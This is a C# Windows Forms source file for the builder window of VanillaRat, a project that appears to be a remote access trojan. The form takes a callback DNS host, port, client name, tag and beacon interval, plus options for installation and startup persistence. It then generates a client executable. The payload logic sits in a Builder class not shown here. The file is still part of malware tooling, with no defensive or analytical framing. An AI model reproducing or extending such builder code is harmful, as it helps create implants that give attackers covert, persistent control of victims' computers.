using System;
using System.Diagnostics;
using System.Windows.Forms;
using VanillaRat.Classes;

namespace VanillaRat.Forms
{
    public partial class BuilderForm : Form
    {
        public BuilderForm()
        {
            InitializeComponent();
            MinimizeBox = false;
            MaximizeBox = false;
            Update = true;
        }

        public bool Update { get; set; }

        //Build client
        private void btnBuild_Click(object sender, EventArgs e)
        {
            if (txtDNS.Text == null || txtPort.Text == null || txtName.Text == null || txtClientTag.Text == null ||
                txtInterval.Text == null)
            {
                MessageBox.Show("Error: One or more text fields is empty.", "Error", MessageBoxButtons.OK,
                    MessageBoxIcon.Error);
                return;
            }
            Builder ClientBuilder = new Builder();
            try
            {
                Convert.ToInt16(txtPort.Text);
                Convert.ToInt16(txtInterval.Text);
            }
            catch (Exception EX)
            {
                MessageBox.Show("Error: " + EX.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string Install = cbEnableInstallation.Checked ? "True" : "False";
            string Startup = cbEnableStartup.Checked ? "True" : "False";

            ClientBuilder.BuildClient(txtPort.Text, txtDNS.Text, txtName.Text, txtClientTag.Text, txtInterval.Text,
                Install, Startup);
            Process.Start("explorer.exe", Environment.CurrentDirectory + @"\Clients\");
            Hide();
        }

        //If enable install checked
        private void cbEnableInstallation_CheckedChanged(object sender, EventArgs e)
        {
            if (cbEnableInstallation.Checked)
                cbEnableStartup.Enabled = true;
            else
                cbEnableStartup.Enabled = false;
        }

        //On form close
        private void BuilderForm_FormClosing(object sender, FormClosingEventArgs e)
        {
            Update = false;
        }
    }
}